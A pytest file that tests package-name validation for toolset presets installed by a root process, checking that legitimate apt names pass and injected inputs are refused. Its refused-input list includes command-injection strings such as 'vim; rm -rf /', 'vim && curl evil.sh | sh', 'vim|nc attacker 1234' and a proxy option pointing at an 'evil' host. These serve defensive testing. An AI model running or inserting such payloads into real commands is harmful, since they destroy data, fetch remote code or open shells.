"""Toolset resolution. These names reach a root process, so the validation
tests here are security tests, not tidiness tests."""
import pytest

from mmd import presets as PS


def test_every_preset_resolves():
    for key in PS.PRESETS:
        assert PS.resolve([key])


def test_every_shipped_package_name_is_itself_valid():
    for preset in PS.PRESETS.values():
        for name in preset.packages:
            assert PS.PACKAGE_RE.match(name), f"{name} in {preset.key}"


def test_catalogue_exposes_key_summary_and_packages():
    for entry in PS.catalogue():
        assert entry["key"] and entry["summary"] and entry["packages"]


@pytest.mark.parametrize("name", [
    "vim", "neovim", "python3-dev", "g++", "lib32z1", "a", "node.js", "x11-utils",
])
def test_legitimate_package_names_are_accepted(name):
    assert PS.validate_package(name) == name.lower()


@pytest.mark.parametrize("name", [
    "vim; rm -rf /",
    "vim && curl evil.sh | sh",
    "vim|nc attacker 1234",
    "$(whoami)",
    "`id`",
    "../../etc/passwd",
    "vim\nrm -rf /",
    "vim rm",
    "--force-yes",
    "-oAcquire::http::Proxy=http://evil",
    "",
    "   ",
    "a" * 80,
    "パッケージ",
])
def test_shell_metacharacters_and_junk_are_refused(name):
    with pytest.raises(PS.PresetError):
        PS.validate_package(name)


def test_names_are_lowercased_because_apt_names_are_lowercase():
    assert PS.validate_package("VIM") == "vim"


def test_surrounding_whitespace_is_trimmed():
    assert PS.validate_package("  htop  ") == "htop"


def test_unknown_toolset_is_refused():
    with pytest.raises(PS.PresetError):
        PS.resolve(["not-a-toolset"])


def test_duplicates_are_removed_but_order_is_kept():
    out = PS.resolve(["editors"], ["vim", "curl", "vim", "curl"])
    assert out.count("vim") == 1 and out.count("curl") == 1
    assert out.index("vim") < out.index("curl")


def test_combining_toolsets_merges_their_packages():
    out = PS.resolve(["editors", "monitoring"])
    assert "vim" in out and "btop" in out


def test_extra_packages_are_appended_after_presets():
    out = PS.resolve(["editors"], ["ripgrep"])
    assert out[-1] == "ripgrep"


def test_a_bad_extra_package_fails_the_whole_request():
    # All or nothing: a partly-applied install is worse than none.
    with pytest.raises(PS.PresetError):
        PS.resolve(["editors"], ["ripgrep", "evil; sh"])


def test_too_many_packages_are_refused():
    with pytest.raises(PS.PresetError):
        PS.resolve(None, [f"pkg{i}" for i in range(PS.MAX_PACKAGES + 1)])


def test_exactly_the_limit_is_allowed():
    assert len(PS.resolve(None, [f"pkg{i}" for i in range(PS.MAX_PACKAGES)])) == PS.MAX_PACKAGES


def test_empty_request_yields_nothing():
    assert PS.resolve([], []) == []
    assert PS.resolve(None, None) == []
